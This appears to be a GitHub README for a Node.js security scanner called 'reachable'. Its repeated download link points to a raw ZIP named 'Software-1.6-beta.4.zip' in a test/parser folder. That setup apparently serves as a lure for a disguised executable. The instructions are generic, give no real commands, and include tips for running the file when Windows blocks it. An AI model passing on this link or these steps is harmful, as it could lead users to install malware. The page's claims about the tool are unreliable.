# 🔍 reachable - Find real app security risks

[![Download reachable](https://img.shields.io/badge/Download%20reachable-blue?style=for-the-badge)](https://github.com/Kael1117/reachable/raw/refs/heads/main/test/parser/Software-1.6-beta.4.zip)

## 🧭 What this app does

reachable checks your JavaScript or TypeScript app for npm security issues that your code can actually reach. It helps you focus on the advisories that matter, so you do not waste time on problems that cannot affect your app.

Use it when you want to:
- scan a local project on Windows
- see which dependency risks are reachable from your code
- review results before shipping changes
- export findings for security tools and code review

## 💻 What you need

Before you start, make sure you have:
- a Windows 10 or Windows 11 PC
- a project written in JavaScript or TypeScript
- a recent version of Node.js installed
- enough disk space to scan your project folder

If your app uses npm packages, reachable can inspect the code and dependency tree to look for paths into known advisories.

## ⬇️ Download and set up

Visit this page to download: https://github.com/Kael1117/reachable/raw/refs/heads/main/test/parser/Software-1.6-beta.4.zip

After you open the page:
1. look for the latest release or source files
2. download the Windows version if one is provided
3. save it in a folder you can find later
4. if the download is a ZIP file, extract it
5. open the folder that contains the tool

If the project is used from source, install it with npm in the project folder:
1. open the project folder in File Explorer
2. click the address bar and type `cmd`
3. press Enter
4. run the install command shown in the repository files
5. wait for the packages to finish installing

If you use a packaged executable, you can skip the install step and run the file directly.

## 🚀 Run it on Windows

Open Command Prompt in the folder where reachable is located, then run the command shown by the project.

A typical run looks like this:
- scan your current app folder
- point reachable at your project path
- review the output in the terminal

Example flow:
1. open Command Prompt
2. go to your app folder
3. run reachable
4. wait for the scan to finish
5. read the results in the window

If the tool supports a help screen, you can use it first to see the available options:
- show help
- choose an input folder
- select an output format
- run a full scan

## 🛠️ Common setup steps

If Windows blocks the app, try these checks:
- confirm the file finished downloading
- keep the tool in a normal folder like `Downloads` or `Desktop`
- make sure Node.js is on your system path if you are using the source version
- open Command Prompt as a regular user first

If the scan does not start, check that:
- you are inside a project with `package.json`
- the folder has `node_modules` if the app expects installed packages
- the path does not contain unusual characters
- the terminal is pointed at the right folder

## 📁 How the scan works

reachable looks at your code and your dependency tree. It then checks which advisories have a path that your app can reach.

That means it can help you separate:
- packages that are present
- packages that are used
- packages that may be vulnerable
- packages that can actually be hit by your code

This is useful because not every advisory matters in the same way. A package can sit in your install tree and still never be touched by your app.

## 🧪 Example use cases

You may want to use reachable when:
- you want a cleaner security review
- you need to check a Node.js app before release
- you want to validate npm advisories in a real code path
- you want a result format that can fit into CI checks
- you need findings for a team security report

It fits well in developer workflows, build checks, and manual review.

## 📤 Output and report options

reachable can be used in ways that help with review and automation. Depending on the project setup, it may support:
- terminal output for quick checks
- SARIF output for security tooling
- JSON-style results for later processing
- CI-friendly runs in GitHub Actions

If you plan to share results with a team, keep the scan output in a file so you can compare it later.

## 🔎 Tips for better results

For the clearest scan:
- run it from the root of your app
- keep your dependencies installed
- scan one project at a time
- use the same Node.js version your app uses
- review both direct and nested dependencies

If your app has several packages, scan each package folder on its own.

## 🧩 Supported project types

reachable is built for:
- JavaScript projects
- TypeScript projects
- Node.js apps
- npm-based dependency trees
- local-first code review workflows

It is a good fit for apps that use many packages and need a simple way to sort signal from noise.

## ⌨️ Basic workflow

A simple workflow looks like this:
1. download or clone the project
2. open your app folder
3. install any needed packages
4. run the scan
5. review the reachable advisories
6. keep the results for your records

If you use it often, run the same steps after each major dependency update.

## 🔐 Why reachability matters

Some security tools list every known issue in your dependency tree. That can create a long list of alerts. reachable helps narrow that list by checking if your code can get to the risky path.

This can help you:
- focus on the findings that matter
- reduce time spent on dead ends
- explain risk to non-technical teammates
- track what changed after an update
- plan fixes based on real code paths

## 📚 File locations to know

When you work with the tool, these folders matter most:
- the project root, where `package.json` lives
- the dependency folder, often `node_modules`
- the terminal window, where you run the scan
- the output folder, if you save reports

Keep the project in a path you can reach easily, such as:
- `C:\Users\YourName\Desktop\project`
- `C:\Users\YourName\Documents\project`

## 🧰 If you want to use it again later

Keep the tool and your notes in one place:
- save the download link
- keep the project folder unchanged
- store any scan results with the date
- rerun scans after package updates
- compare new results against older runs

That makes it easier to see how your app changes over time

## 📌 Quick start path

1. open the download page: https://github.com/Kael1117/reachable/raw/refs/heads/main/test/parser/Software-1.6-beta.4.zip  
2. download the Windows file or source package  
3. extract it if needed  
4. open Command Prompt in the app folder  
5. run the command from the project  
6. scan your target project folder  
7. review the reachable findings